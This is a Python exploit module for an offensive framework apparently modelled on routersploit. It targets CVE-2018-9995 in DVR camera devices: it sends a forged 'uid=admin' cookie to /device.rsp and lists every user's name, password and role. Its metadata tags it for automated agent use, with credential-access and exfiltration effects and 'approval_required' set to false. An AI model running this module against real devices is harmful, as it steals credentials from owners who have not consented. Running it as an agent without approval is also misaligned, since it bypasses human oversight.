#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DVR Creds Disclosure"""

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'DVR Creds Disclosure',
        'description': 'Module exploits authentication bypass vulnerability in multiple DVR devices allowing attacker to retrieve users credentials.',
        'author': ['ezelf', 'Marcin Bury'],
        'cve': ['CVE-2018-9995'],
        'platform': Platform.LINUX,
        'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995', 'https://github.com/ezelf/CVE-2018-9995_dvr_credentials'],
        'tags': ['iot', 'camera', 'disclosure', 'credentials', 'unauth', 'cve-2018-9995', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target seems to be vulnerable")
            print_table(("Username", "Password", "Role"), *self.credentials)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        cookies = {
            "uid": "admin",
        }
        response = self.http_request(
            method="GET",
            path="/device.rsp?opt=user&cmd=list",
            cookies=cookies,
        )

        if response:
            try:
                json_data = json.loads(response.text)
                for data in json_data["list"]:
                    self.credentials.append((data["uid"], data["pwd"], data["role"]))
                return True  # target is vulnerable
            except Exception:
                pass

        return False  # target is not vulnerable
